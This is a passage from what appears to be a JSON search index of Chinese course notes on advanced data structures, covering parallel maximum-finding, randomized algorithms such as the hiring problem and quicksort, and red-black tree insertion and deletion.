\u7b97\u6cd5\u9012\u5f52\u8ba1\u7b97\u3002\u6bcf\u4e00\u6b21\u9012\u5f52\u5b8c\u6210\uff0c\u90fd\u80fd\u5f97\u5230\u8be5\u6bb5\u5185\u5143\u7d20\u7684\u6700\u5927\u503c\uff0c\u5bf9\u8fd9\u4e9b\u6700\u5927\u503c\u8fdb\u884c\u5927\u529f\u7387\u8dd1\u8f66\u7b97\u6cd5\u6c42\u7684\u603b\u4f53\u7684\u6700\u5927\u503c\u3002</p> <p>\u5bf9 \\(\\sqrt{n}\\) \u4e2a\u6bb5\u5e76\u884c\u6267\u884c Doubly-logarithmic Paradigm \u7b97\u6cd5\u6240\u9700\u65f6\u95f4\u4e3a \\(T_1= T(\\sqrt{n})\\)\uff0c\u6240\u9700\u7684\u5904\u7406\u5668\u6570\u91cf\u4e3a \\(W_1 =\\sqrt{n} W(\\sqrt{n})\\)\uff0c\u5e76\u5f97\u5230 \\(\\sqrt{n}\\) \u4e2a\u6bb5\u6700\u5927\u503c\u3002\u5bf9\u6bb5\u6700\u5927\u503c\u5e94\u7528\u5927\u529f\u7387\u8dd1\u8f66\u7b97\u6cd5\uff0c\u6240\u9700\u65f6\u95f4\u4e3a \\(T_2=O(1)\\)\uff0c\u6240\u9700\u5904\u7406\u5668\u4e3a \\(W_2=O(\\sqrt{n}^2)=O(n)\\)\uff0c\u90a3\u4e48\u603b\u65f6\u95f4\u6d88\u8017\u4e3a\u4e8c\u8005\u76f8\u52a0\uff1a</p> \\[\\begin{array}l \\begin{cases}T(n)= T(\\sqrt{n}) \\\\ W(n)=\\sqrt{n}W(\\sqrt{n}) +O(n)\\end{cases} \\\\ \\begin{cases} T(n)=O(\\log \\log n)\\\\ W(n)=O(n\\log \\log n) \\end{cases} \\end{array} \\] <p></p> <p>\u5728\u4ee5\u4e0a Doubly-logarithmic Paradigm \u7684\u57fa\u7840\u4e0a\u8fd8\u53ef\u4ee5\u8fdb\u884c\u9002\u5f53\u4f18\u5316\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u5143\u7d20\u5212\u5206\u4e3a\u957f \\(h=\\log \\log n\\) \u7684\u5c0f\u6bb5\uff0c\u603b\u5171\u5206\u4e3a \\(n / h\\) \u6bb5\uff0c\u5bf9\u6bcf\u4e2a\u6bb5\u8fdb\u884c\u65f6\u95f4\u590d\u6742\u5ea6 \\(T_1=O(h)\\)\uff0c\u5de5\u4f5c\u590d\u6742\u5ea6 \\(W_1 =O(h)\\) \u7684\u7b97\u6cd5\u5e76\u884c\u627e\u51fa\u6bb5\u6700\u5927\u503c\uff0c\u90a3\u4e48\u8fd9\u4e00\u6b65\u9aa4\u7684\u603b\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(h)\\)\uff0c\u603b\u5de5\u4f5c\u590d\u6742\u5ea6\u4e3a \\(\\frac{n}{h}O(  h)\\)\u3002\u6700\u540e\uff0c\u5bf9\u5f97\u51fa\u7684 \\(\\frac{n}{h}\\) \u4e2a\u6bb5\u6700\u5927\u503c\u5e94\u7528 Doubly-logarithmic Paradigm \u7b97\u6cd5\uff0c\u8fd9\u4e00\u6b65\u9aa4\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u548c\u5de5\u4f5c\u590d\u6742\u5ea6\u5206\u522b\u4e3a\uff1a\\(T_2=O(\\log \\log \\frac{n}{h}), W_2=O( \\frac{n}{h}\\log \\log \\frac{n}{h})\\) \uff1a</p> \\[ \\begin{cases}T(n)=O(h)+O\\left(\\log \\log \\frac{n}{h}\\right)=O(\\log \\log n) \\\\ W(n)= \\frac{n}{h}O(h) +O( \\frac{n}{h}\\log \\log \\frac{n}{h})=O(n) \\end{cases} \\] <p></p> <p>\u8fd9\u91cc\u5c0f\u6bb5\u65f6\u95f4\u590d\u6742\u5ea6\u548cWorkload\u5747\u4e3a \\(O(h)\\) \u5e94\u8be5\u662f\u7528\u4e86\u66b4\u529b\u679a\u4e3e\uff0c\u4f46\u662f\u6211\u611f\u89c9\u7528\u4e8c\u5206\u6cd5\u53ef\u4ee5\u964d\u4f4e\u65f6\u95f4\u590d\u6742\u5ea6</p> <p>Solution 3: Random Sampling</p> <p>\u76ee\u6807\u662f\u5f97\u5230\u4e00\u4e2a\u5728\u6781\u5927\u6982\u7387\u4fdd\u8bc1\u6b63\u786e\u6027\u7684\u524d\u63d0\u4e0b\uff0c\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(1)\\)\uff0c\u5de5\u4f5c\u590d\u6742\u5ea6\u4e3a \\(O(n)\\) \u7684\u968f\u673a\u7b97\u6cd5\u3002</p> <p>\u4ece\u5143\u7d20\u6bcf \\(n^{1 / 8}\\) \u4e2a\u6570\u4e2d\u968f\u673a\u62bd\u53d6\u4e00\u4e2a\u6570\uff0c\u5171 \\(n^{ 7 / 8}\\) \u4e2a\u6570\u3002\u5728\u5c06\u8fd9\u4e9b\u6570\u6309\u7167\u6bcf\u6bb5 \\(n^{ 1 / 8}\\) \u5212\u5206\u4e3a Block\uff0c\u5171\u5206\u4e3a \\(n^{ 6 / 8}\\) \u4e2a\u5757\u3002\u90a3\u4e48\u5bf9\u4e8e\u6bcf\u4e2a\u5757\u5e76\u884c\u5e94\u7528\u5927\u529f\u7387\u8dd1\u8f66\u7b97\u6cd5\uff1a</p> \\[ \\begin{cases}T=O(1) \\\\ W=O((n^{1 / 8})^2) = O( n^{ 1 / 4})\\end{cases} \\xrightarrow {\\text{\u5e76\u884c}} \\begin{cases} T=O(1)   \\\\ W=n^{ 6 / 8} O(n^{1 /4}) =O(n)  \\end{cases} \\] <p>\u8fd9\u6837\u6211\u4eec\u5f97\u5230\u6bcf\u4e2a\u5757\u7684\u6bb5\u6700\u5927\u503c\uff0c\u5171\u6709 \\(n^{6 / 8}\\) \u4e2a\u503c\u3002\u5bf9\u4e8e\u8fd9\u4e9b\u503c\uff0c\u518d\u6b21\u6309\u7167\u6bcf\u6bb5 \\(n^{1/ 4}\\) \u6765\u5212\u5206\u4e3a Block\uff0c\u5171\u5212\u5206\u4e3a \\(n^{1 / 2}\\) \u4e2a\u5757\uff0c\u518d\u6b21\u5bf9\u6bcf\u4e2a\u5757\u5e76\u884c\u5e94\u7528\u5927\u529f\u7387\u8dd1\u8f66\u7b97\u6cd5\uff1a</p> \\[ \\begin{cases}T=O(1) \\\\ W=O((n^{1 / 4})^2) = O( n^{ 1 / 2})\\end{cases} \\xrightarrow {\\text{\u5e76\u884c}} \\begin{cases} T=O(1)   \\\\ W=n^{ 1 / 2} O(n^{1 /2}) =O(n)  \\end{cases} \\] <p>\u5f97\u5230 \\(n^{1 / 2}\\) \u4e2a\u6700\u5927\u503c\u3002\u6b64\u65f6\u4e0d\u9700\u8981\u518d\u8fdb\u884c\u5206\u5757\u4e86\uff0c\u76f4\u63a5\u5bf9\u8fd9 \\(n^{1 / 2}\\) \u4e2a\u6570\u8fdb\u884c\u5927\u529f\u7387\u8dd1\u8f66\u7b97\u6cd5\uff1a</p> \\[ \\begin{cases} T=O(1)  \\\\ W=O(n)\\end{cases} \\] <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u4ece \\(n\\) \u4e2a\u6570\u4e2d\u91c7\u6837 \\(n^{7 / 8}\\) \u4e2a\u6570\u5e76\u627e\u51fa\u6700\u5927\u503c\u7684\u65f6\u95f4\u3001\u5de5\u4f5c\u590d\u6742\u5ea6\u5206\u522b\u4e3a \\(O(1), O(n)\\)\u3002</p> <p>\u5728\u6211\u4eec\u5f97\u5230 \\(n^{7 / 8}\\) \u4e2a\u6570\u4e2d\u6700\u5927\u503c \\(M\\) \u7684\u57fa\u7840\u4e0a\uff0c\u8fd8\u53ef\u4ee5\u5bf9\u5176\u8fdb\u884c\u4e0b\u9762\u68c0\u9a8c\u4ee5\u5bfb\u627e\u771f\u6b63\u7684\u6700\u5927\u503c\u3002\u5176\u601d\u60f3\u5728\u4e8e\u7528 n \u4e2a\u5904\u7406\u5668\u5e76\u884c\u68c0\u9a8c\u6bcf\u4e00\u4e2a\u5143\u7d20\uff0c\u5982\u679c\u8be5\u5143\u7d20\u5927\u4e8e \\(M\\) \uff0c\u5219\u5c06\u5176\u7f6e\u4e8e\u4e00\u4e2a\u65b0\u57df \\(B\\)\u3002\u5982\u679c \\(B\\) \u7684\u89c4\u6a21\u518d\u6b21\u8fbe\u5230 \\(n^{7 / 8}\\) \uff0c\u5219\u91cd\u590d\u5bf9\u5b83\u8fdb\u884c\u4e0a\u8ff0\u7b97\u6cd5\uff0c\u5f97\u5230\u4e00\u4e2a\u65b0\u7684\u3001\u66f4\u51c6\u786e\u7684\u6700\u5927\u503c:</p> <pre><code>while (there is an element larger than M) {\n     for (each element larger than M)\n         Throw it into a random place in a new B(n^7/8);\n     Compute a new M;\n}\n</code></pre> <p>Theorem Random Sampling \u4ee5\u6781\u9ad8\u7684\u6982\u7387\u53ef\u4ee5\u5728 \\(T=O(1),W=O(n)\\) \u627e\u5230\u6700\u5927\u503c\uff1b\u4e0d\u80fd\u5728\u8fd9\u4e2a\u89c4\u6a21\u8fd0\u884c\u7684\u6982\u7387\u4e3a \\(O( \\frac{1}{n^c})\\)\uff0c\u5176\u4e2d \\(c\\) \u662f\u4e00\u4e2a\u8f83\u5927\u5e38\u6570\u3002</p> <p>Quote</p> <p></p>"},{"location":"Courses/DS/ADS/Randomized%20Algorithms/","title":"Randomized Algorithms","text":""},{"location":"Courses/DS/ADS/Randomized%20Algorithms/#randomized-algorithms","title":"Randomized Algorithms","text":"<p> \u7ea6 809 \u4e2a\u5b57  55 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 5 \u5206\u949f</p> <p>\u4e00\u822c\u7684\u6700\u4f18\u7b97\u6cd5\u53ef\u4ee5\u770b\u4f5c\u662f\u7279\u6b8a\u7684\u968f\u673a\u7b97\u6cd5\uff1aYield the correct answer with high probability</p>"},{"location":"Courses/DS/ADS/Randomized%20Algorithms/#the-hiring-problem","title":"\u7ecf\u5178\u6848\u4f8b\uff1aThe Hiring Problem","text":"<p>HeadHunter \u5e2e\u7ecf\u7406\u63a8\u8350 \\(N\\) \u4e2a Applicants\uff0c\u7ecf\u7406\u6bcf\u5929\u53ef\u4ee5\u9762\u8bd5\u4e00\u4e2a\u4eba\uff0c\u4f46\u662f\u53ea\u5f55\u53d6 \\(M\\) \u4e2a\u4eba\u3002</p> <p>\u5176\u4e2d\uff0c\u9762\u8bd5\u4e00\u4e2a\u4eba\u7684\u6d88\u8017 \\(C_i\\) \u8fdc\u5c0f\u4e8e\u96c7\u7528\u4e00\u4e2a\u4eba\u7684\u6d88\u8017 \\(C_h\\)\uff08\u5f55\u53d6\u540e\u518d\u89e3\u96c7\u8fd9\u4e2a\u4eba\u4e5f\u8981\u4ea4\u94b1\uff09\u3002</p> <p>\u4e0b\u9762\u6211\u4eec\u5c06 M \u7f6e 1 \u8003\u8651</p>"},{"location":"Courses/DS/ADS/Randomized%20Algorithms/#a-naive-solution","title":"A Naive Solution","text":"<p>\u6309\u7167\u9762\u8bd5\u7684\u987a\u5e8f\uff0c\u5982\u679c\u5f53\u524d\u9762\u8bd5\u7684\u4eba\u662f\u5df2\u9762\u8bd5\u8fc7\u7684\u4eba\u8d28\u91cf\u6700\u597d\u7684\uff0c\u5219\u96c7\u7528\u4ed6\uff08\u540c\u65f6\u89e3\u96c7\u524d\u9762\u96c7\u4f63\u7684\u4eba\uff09\u3002</p> <pre><code>int Hiring ( EventType C[ ], int N )\n{   /* candidate 0 is a least-qualified dummy candidate */\n    int Best = 0;\n    int BestQ = the quality of candidate 0;\n    for ( i=1; i&lt;=N; i++ ) {\n        Qi = interview( i ); /* Ci */\n        if ( Qi &gt; BestQ ) {\n            BestQ = Qi;\n            Best = i;\n            hire( i );  /* Ch */\n        }\n    }\n    return Best;\n}\n</code></pre> <p>\u5176\u4e2d\uff0c\u82e5 candidate \u7684\u8d28\u91cf\u5448\u9012\u589e\u5206\u5e03\uff0c\u5219\u8be5\u7b97\u6cd5\u6240\u5f97\u7684 cost \u5c06\u662f\u6700\u574f\u60c5\u51b5\uff1b\u82e5 candidate \u968f\u673a\u5206\u5e03\uff0c\u5219 candidate i \u5728\u524d i \u4e2a\u4eba\u4e2d\u6700\u4f18\u7684\u6982\u7387\u4e3a \\(\\frac{1}{i}\\) \uff0c\u5206\u6790\u8ba1\u7b97\u5e73\u5747 cost\uff1a</p> \\[ \\begin{array}c X_i =\\begin{cases}1, &amp; \\text{if hired}  \\\\ 0, &amp; \\text{if NOT hired}\\end{cases} \\\\ \\Rightarrow X=\\sum X_i, \\ E[X_i] =Pr[\\text{candidate i is hired}]=\\frac{1}{i} \\\\ \\Rightarrow E[X] =E\\left[\\sum X_i\\right]= \\sum E[X_i] =\\sum_{i=1}^N \\frac{1}{i} = \\ln N +O(1) \\end{array} \\] <p>\u6240\u4ee5\u6700\u7ec8\u7684 Cost \u5927\u81f4\u4e3a \\(O(C_h\\ln N +NC_i)\\)\u3002</p>"},{"location":"Courses/DS/ADS/Randomized%20Algorithms/#randomized-solution","title":"Randomized Solution","text":"<pre><code>int RandomizedHiring ( EventType C[ ], int N )\n{   /* candidate 0 is a least-qualified dummy candidate */\n    int Best = 0;\n    int BestQ = the quality of candidate 0;\n\n    randomly permute the list of candidates; // How to do it???\n\n    for ( i=1; i&lt;=N; i++ ) {\n        Qi = interview( i ); /* Ci */\n        if ( Qi &gt; BestQ ) {\n            BestQ = Qi;\n            Best = i;\n            hire( i );  /* Ch */\n        }\n    }\n}\n</code></pre> <p>\u8fd9\u91cc\u7684\u968f\u673a\u610f\u4e49\u5728\u4e8e\u8f93\u5165\u5e8f\u5217\u4e0d\u518d\u4f9d\u8d56\u4e8e HeadHunter \u7ed9\u51fa\u7684 input\uff0c\u9632\u6b62 HeadHunter \u6545\u610f\u7ed9\u51fa\u6700\u574f\u5e8f\u5217\u7684\u60c5\u51b5\u53d1\u751f\u3002</p> <pre><code>// A feasible function to make randomized input\nvoid PermuteBySorting ( ElemType A[ ], int N )\n{\n    for ( i=1; i&lt;=N; i++ )\n        A[i].P = 1 + rand()%(N3); \n        /* makes it more likely that all priorities are unique */\n    Sort A, using P as the sort keys;\n}\n</code></pre>"},{"location":"Courses/DS/ADS/Randomized%20Algorithms/#online-hiring-problem","title":"Online Hiring Problem","text":"<p>\u4f46\u662f\u6709\u65f6\u6211\u4eec\u5e76\u4e0d\u80fd\u5728\u4e00\u5f00\u59cb\u5c31\u5f97\u5230\u8f93\u5165\u5e8f\u5217\uff0c\u6211\u4eec\u9700\u8981\u4e00\u4e2a Online \u7684\u7b97\u6cd5\uff1a</p> <pre><code>int OnlineHiring ( EventType C[ ], int N, int k)\n{\n    int Best = N;\n    int BestQ = - \uf0a5 ;\n    for ( i=1; i&lt;=k; i++ ) {\n        Qi = interview( i );\n        if ( Qi &gt; BestQ )   BestQ = Qi;\n    }\n    for ( i=k+1; i&lt;=N; i++ ) {\n        Qi = interview( i );\n        if ( Qi &gt; BestQ ) {\n            Best = i;\n            break;\n        }\n    }\n    return Best;\n}\n</code></pre> <p>\u524d\u9762 \\(k\\) \u4e2a\u4eba\u9762\u8bd5\u540e\u53ea\u8bb0\u5f55\u4e0b\u5176\u4e2d\u6700\u5927\u503c\uff0c\u7136\u540e\u9762\u8bd5\u540e\u9762\u7684\u4eba\u7684\u65f6\u5019\uff0c\u9047\u89c1\u66f4\u597d\u7684\u4eba\uff0c\u7acb\u5373\u96c7\u7528\u5e76\u7ed3\u675f\u7b97\u6cd5\u3002</p> <p>\u90a3\u4e48\u53c2\u6570 \\(k\\) \u7684\u9009\u62e9\u5c06\u51b3\u5b9a\u8be5\u7b97\u6cd5\u7684\u4f18\u52a3\uff1a</p> <ul> <li>\\(S_i\\) := \u7b2c i \u4e2a\u5019\u9009\u4eba\u6700\u4f18</li> <li>\\(S_i = \\{A:=\\text{the best one is at position i} \\} \\cap \\{B:= \\text{no one at positions k+1 to i-1 are hired}\\}\\)</li> </ul> \\[\\begin{array}c Pr[S_i] =Pr[A\\cap B] =Pr[A] \\cdot Pr[B] = \\frac{1}{N} \\cdot \\frac{k}{i-1} \\\\ Pr[S] =\\sum_{i=k+1}^N Pr[S_i] = \\sum_{i=k+1}^N \\frac{k}{N(i-1)} = \\frac{k}{N} \\sum_{i=k}^{N-1} \\frac{1}{i} \\end{array}\\] <p>Why \\(\\frac{k}{i-1}\\) ???</p> <p>\u76f8\u5f53\u4e8e\uff0c\u524d \\(i-1\\) \u4e2a\u5019\u9009\u4eba\uff0c\u6700\u4f18\u8005\u51fa\u73b0\u5728\u524d \\(k\\) \u4e2a\u4eba\u4e2d</p> <p>Lemma</p> \\[\\int_k^N \\frac{1}{x} dx = \\sum_{i=k}^{N-1} \\int_i^{i+1} \\frac{1}{x}dx \\le \\sum_{i=k}^{N-1} \\frac{1}{i} \\le \\sum_{i=k}^{N-1} \\int _{i-1}^{i} \\frac{1}{x}dx = \\int _{k-1}^{N-1}\\frac{1}{x}dx\\] \\[ \\frac{k}{N}\\ln \\left(\\frac{N}{k}\\right) \\le Pr[S]\\le \\frac{k}{N} \\ln \\left(\\frac{N-1}{k-1}\\right) \\] <p>\u7ecf\u8fc7\u6c42\u5bfc\uff0c\u53ef\u4ee5\u6c42\u5f97 \\(Pr[S]\\) \u5728 \\(k= \\frac{N}{e}\\) \u5904\u53d6\u5f97\u6700\u5927\u6982\u7387\u3002</p>"},{"location":"Courses/DS/ADS/Randomized%20Algorithms/#quicksort","title":"\u7ecf\u5178\u6848\u4f8b\uff1aQuicksort","text":"<p>\u5feb\u901f\u6392\u5e8f\u7684 Pivot \u9009\u62e9\uff0c\u4e24\u8fb9\u81f3\u5c11\u90fd\u6709 \\(n/4\\) \u5143\u7d20\uff0c\u4ee5\u4f7f\u5f97\u65f6\u95f4\u590d\u6742\u5ea6\u4ecd\u4e3a \\(O(N\\log N)\\)\uff08\u6bd4\u7406\u60f3\u7684 \\(n/2\\) \u62e5\u6709\u66f4\u5927\u7684\u5e38\u6570\uff09\uff0c\u8fd9\u6837\u7684 Pivot \u79f0\u4e3a Central Splitter\u3002</p> <p>\u6211\u4eec\u4e4b\u524d\u5b66\u8fc7\u7684\u5feb\u6392\u662f\u5728\u9996\u4e2d\u5c3e\u4e09\u4e2a\u6570\u4e2d\u9009\u4e2d\u4f4d\u6570\uff0c\u4f46\u8fd9\u6837\u5e76\u4e0d\u80fd\u4fdd\u8bc1 Pivot \u7684\u9009\u62e9\u662f Central Splitter\u3002</p> <p>\u800c\u968f\u673a\u5316\u7684\u5feb\u901f\u6392\u5e8f\u5728\u6bcf\u6b21\u9012\u5f52\u90fd\u9009\u62e9 Central Splitter \u4f5c\u4e3a Pivot\uff0c\u5176\u601d\u60f3\u4e3a\u91cd\u590d\u968f\u673a\u9009\u62e9\uff0c\u76f4\u5230\u9009\u51fa Central Splitter\uff0c\u5176\u671f\u671b\u9009\u62e9\u6b21\u6570\u4e3a 2 \u6b21\uff0c\u6bcf\u6b21\u9009\u62e9\u7684\u4ee3\u4ef7\u4e3a \\(O(N)\\)\u3002</p> <p>Why 2???</p> \\[1* \\frac{1}{2} +2* \\frac{1}{4}+ 3*\\frac{1}{8}+...\\] <p></p> <p>Worst Case \u4ece\u539f\u6765\u7684 \\(O(N^2)\\) \u3001Best Case \u4ece\u539f\u6765\u7684 \\(O(N)\\) \u90fd\u53d8\u6210\u4e86 \\(O(N\\log N)\\)</p>"},{"location":"Courses/DS/ADS/Red-Black%20Trees%20%26%20B%2B%20Trees/","title":"Red-Black Trees & B+ Trees","text":"<p> \u7ea6 1411 \u4e2a\u5b57  9 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p>"},{"location":"Courses/DS/ADS/Red-Black%20Trees%20%26%20B%2B%20Trees/#_1","title":"\u7ea2\u9ed1\u6811","text":"<p>https://www.cs.usfca.edu/~galles/visualization/RedBlack.html</p> <p>\u5b9a\u4e49\uff1a</p> <ul> <li>\u6bcf\u4e2a\u8282\u70b9\u8981\u4e48\u662f\u7ea2\u8272\u8981\u4e48\u662f\u9ed1\u8272</li> <li>\u6839\u8282\u70b9\u4e3a\u9ed1\u8272</li> <li>\u7ea2\u9ed1\u6811\u7684\u53f6\u8282\u70b9\u5b9a\u4e49\u4e3a NULL(NIL) \uff0c\u53f6\u8282\u70b9\u90fd\u662f\u9ed1\u8272\uff0c\u4e0d\u663e\u5f0f\u753b\u51fa</li> <li>\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u662f\u7ea2\u8272\uff0c\u90a3\u4e48\u5b83\u7684\u5b69\u5b50\u90fd\u5e94\u8be5\u4e3a\u9ed1\u8272</li> <li>\u6bcf\u4e2a\u8282\u70b9\u5230\u5b83\u7684\u540e\u4ee3\u53f6\u8282\u70b9\u7684\u8def\u5f84\u5305\u542b\u76f8\u540c\u6570\u91cf\u7684\u9ed1\u8272\u8282\u70b9<ul> <li>\u5b9a\u4e49 black-height \u4e3a\u4efb\u4e00\u8282\u70b9x\u5230\u53f6\u8282\u70b9\u6240\u7ecf\u8fc7\u7684\u9ed1\u8272\u8282\u70b9\u6570\u91cf\uff08\u5305\u62ecx\uff09</li> </ul> </li> </ul> <p>Lemma</p> <p>\u4e00\u4e2a\u5177\u6709 N \u4e2a\u5185\u90e8\u8282\u70b9\uff08Internal nodes\uff09\u7684\u7ea2\u9ed1\u6811\uff0c\u5b83\u7684\u9ad8\u5ea6\u4e0d\u8d85\u8fc7 \\(2\\log (N+1)\\)</p>"},{"location":"Courses/DS/ADS/Red-Black%20Trees%20%26%20B%2B%20Trees/#insert","title":"Insert","text":"<p>\u63d2\u5165\u7684\u8282\u70b9\u9ed8\u8ba4\u989c\u8272\u4e3a\u7ea2\u8272\uff0c\u4ee5\u4e0b\u7684\u56fe\u7247\u901a\u8fc7 Insert 4 \u6765\u5c55\u793a\u5173\u4e8e\u7ea2\u9ed1\u6811\u63d2\u5165\u7684\u6240\u6709\u60c5\u51b5\u3002</p> <p>\u5176\u4e2d\u5e94\u6ce8\u610f\uff0c\u8282\u70b9 15 \u5e94\u8be5\u4e3a\u7ea2\u8272\uff0c\u8be5\u56fe\u6709\u9519\u8bef</p> <p></p> <p>From  Oneko \u7684\u7b14\u8bb0</p> <p>\u7ea2\u9ed1\u6811\u63d2\u5165\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e5f\u4e3a \\(O(\\log N)\\)</p> <p>\u7ea2\u9ed1\u6811\u7ef4\u62a4\u7684\u5173\u952e\u601d\u60f3\u5728\u4e8e\u4f7f\u7528 Rotate \u4ee5\u53ca\u53d8\u8272\u4fdd\u6301\u9ed1\u9ad8\u76f8\u540c</p> <p>\u4ece Empty Tree \u5f00\u59cb\uff0c\u4f9d\u6b21\u63d2\u5165 41, 38, 31, 12, 19, 8</p> <p></p> <p>\u81ea\u5df1\u5c1d\u8bd5\u4e00\u4e0b insert(1,2,3,4,5,6,7), \u6700\u540e\u6839\u8282\u70b9\u4e3a2\uff0c\u51714\u4e2a\u9ed1\u8282\u70b9</p> <p>\u60f3\u4e86\u60f3\u8fd8\u662f\u628a\u8bfe\u4ef6\u4e0a\u7684\u56fe\u653e\u4e0a\u6765\u5427</p> <p></p>"},{"location":"Courses/DS/ADS/Red-Black%20Trees%20%26%20B%2B%20Trees/#delete","title":"Delete","text":"<p>\u7ea2\u9ed1\u6811\u7684\u5220\u9664\u5206\u4e3a\u4e24\u4e2a\u6b65\u9aa4\uff1a</p> <p>\u7b2c\u4e00\u6b65\uff1a</p> <ul> <li>\u5220\u9664\u53f6\u5b50\u8282\u70b9<ul> <li>\u5982\u679c\u8be5\u8282\u70b9\u4e3a\u7ea2\u8272\uff0c\u4f7f\u7528 NIL \u4ee3\u66ff\u8be5\u8282\u70b9\uff0c\u4e14\u65e0\u9700\u8fdb\u884c\u7b2c\u4e8c\u6b65\u8c03\u6574</li> <li>\u5982\u679c\u8be5\u8282\u70b9\u4e3a\u9ed1\u8272\uff0c\u4f7f\u7528 NIL \u4ee3\u66ff\u8be5\u8282\u70b9\uff0c\u4e14\u9700\u8fdb\u884c\u7b2c\u4e8c\u6b65\u8c03\u6574\uff0c\u5c06\u8be5 NIL \u8282\u70b9\u8bb0\u4e3a x</li> </ul> </li> <li>\u5220\u9664\u5ea6\u4e3a 1 \u7684\u8282\u70b9<ul> <li>\u7528\u5b83\u7684\u5b69\u5b50\u4ee3\u66ff\u8be5\u8282\u70b9\uff0c\u5e76\u6539\u4e3a\u9ed1\u8272\uff0c\u65e0\u9700\u8fdb\u884c\u7b2c\u4e8c\u6b65\u8c03\u6574</li> <li>\u8fd9\u79cd\u60c5\u51b5\uff0c\u53ea\u53ef\u80fd\u662f\u8be5\u8282\u70b9\u4e3a\u9ed1\u8272\uff0c\u5b50\u8282\u70b9\u4e3a\u7ea2\u8272\uff0c\u5426\u5219\u4f1a\u8fdd\u53cd\u7ea2\u9ed1\u6811\u6027\u8d28</li> </ul> </li> <li>\u5220\u9664\u5ea6\u4e3a 2 \u7684\u8282\u70b9<ul> <li>\u4e0e\u5de6\u5b50\u6811\u4e2d\u6700\u5927\u7684\u8282\u70b9\u6216\u662f\u53f3\u5b50\u6811\u4e2d\u6700\u5c0f\u7684\u8282\u70b9\u4ea4\u6362\u503c\uff0c\u5e76\u5bf9\u5176\u8c03\u7528\u5220\u9664\uff0c\u91cd\u65b0\u8fdb\u5165\u4e0a\u8ff0\u4e24\u79cd\u60c5\u51b5\u4e4b\u4e00</li> </ul> </li> </ul> <p>\u5176\u5b9e\u5c31\u662f\u5bf9\u666e\u901a\u4e8c\u53c9\u641c\u7d22\u6811\u7684\u5220\u9664\u64cd\u4f5c\uff0c\u4f46\u662f\u5220\u9664\u8fc7\u7a0b\u4e2d\u51cf\u5c11\u4e86\u5b50\u6811\u9ed1\u9ad8\u5bfc\u81f4\u5931\u8861</p> <p>\u7b2c\u4e8c\u6b65\uff1a</p> <p>\u80fd\u8fdb\u5165\u7b2c\u4e8c\u6b65\u8c03\u6574\uff0c\u8bf4\u660e\u6700\u7ec8\u5220\u9664\u7684\u662f\u9ed1\u8272\u53f6\u5b50\u8282\u70b9\uff0c\u5c06\u7528\u4f5c\u66ff\u4ee3\u7684 NIL \u8bb0\u4e3a x\uff0c\u5b83\u7684 sibling \u8bb0\u4e3a w \uff0c\u5b83\u7684\u7236\u8282\u70b9\u79f0\u4e3a p</p> <p>Case 1\uff1a</p> <p>\u8282\u70b9 w \u4e3a\u7ea2\u8272\u8282\u70b9\uff0c\u90a3\u4e48\u7236\u8282\u70b9\u4e00\u5b9a\u662f\u9ed1\u8272\u8282\u70b9\u3002</p> <p>\u8c03\u6574\u64cd\u4f5c\u4e3a\u5bf9\u8282\u70b9 p \u548c w \u90fd\u8fdb\u884c\u53d8\u8272\uff0c\u7136\u540e\u5bf9\u8282\u70b9 p \u8fdb\u884c Rotate\uff1a</p> <p></p> <p>\u6700\u540e\u4e00\u6b65\u591a\u51fa\u6765\u7684\u9ed1\u8272\u8282\u70b9\u662f\u8282\u70b9 w \u539f\u5148\u7684\u5de6\u5b69\u5b50</p> <p>\u6b64\u65f6\u9700\u8981\u7ee7\u7eed\u8c03\u6574\uff0c\u8f6c\u5165 Case 2\uff0c3\uff0c4</p> <p>Case 2\uff1a</p> <p>\u8282\u70b9 w \u4e3a\u9ed1\u8272\u8282\u70b9\uff0c\u4e14 w \u7684\u4e24\u4e2a\u5b50\u8282\u70b9\u5747\u4e3a\u9ed1\u8272\u8282\u70b9</p> <p>\u8c03\u6574\u64cd\u4f5c\u4e3a\u5c06\u8282\u70b9 w \u53d8\u8272\u4e3a\u7ea2\u8272\u3002\u82e5\u8282\u70b9 p \u4e3a\u7ea2\u8272\uff0c\u76f4\u63a5\u5c06\u5176\u53d8\u4e3a\u9ed1\u8272\u7ed3\u675f\u8c03\u6574\uff1b\u82e5\u8282\u70b9 p \u4e3a\u9ed1\u8272\uff0c\u91cd\u65b0\u5c06\u5176\u547d\u540d\u4e3a\u8282\u70b9 x \uff0c\u9700\u8981\u7ee7\u7eed\u8c03\u6574\uff0c\u8f6c\u5165 Case 2\uff0c3\uff0c4</p> <p></p> <p>Case 3\uff1a</p> <p>\u8282\u70b9 w \u4e3a\u9ed1\u8272\u8282\u70b9\uff0c\u4e14\u5b83\u7684\u552f\u4e00\u7ea2\u8272\u5b50\u8282\u70b9\u4e0e w,p \u6784\u6210 RL \u5173\u7cfb\uff08\u5bf9\u79f0\u60c5\u51b5\u4e0d\u5217\u51fa\uff09</p> <p>\u8c03\u6574\u64cd\u4f5c\u4e3a\u5c06\u8282\u70b9 w \u4e0e\u5176\u552f\u4e00\u7ea2\u8272\u5b50\u8282\u70b9\u53d8\u8272\uff0c\u5e76\u5bf9\u8282\u70b9 w \u8fdb\u884c\u4e00\u6b21\u53f3\u65cb\uff0c\u9700\u8981\u7ee7\u7eed\u8c03\u6574\uff0c\u8f6c\u5165 Case 4</p> <p></p> <p>Case 4\uff1a</p> <p>\u8282\u70b9 w \u4e3a\u9ed1\u8272\u8282\u70b9\uff0c\u4e14\u5b83\u5b58\u5728\u7ea2\u8272\u5b50\u8282\u70b9\u4e0e w,p \u6784\u6210 RR \u5173\u7cfb\uff08\u5bf9\u79f0\u5173\u7cfb\u4e0d\u5217\u51fa\uff09</p> <p>\u8c03\u6574\u64cd\u4f5c\u4e3a\u5c06\u8be5\u7ea2\u8272\u5b50\u8282\u70b9\u53d8\u8272\u4e3a\u9ed1\u8272\uff0c\u8282\u70b9 w \u53d8\u8272\u4e3a\u7236\u8282\u70b9 p \u7684\u989c\u8272\uff0c\u8282\u70b9 p 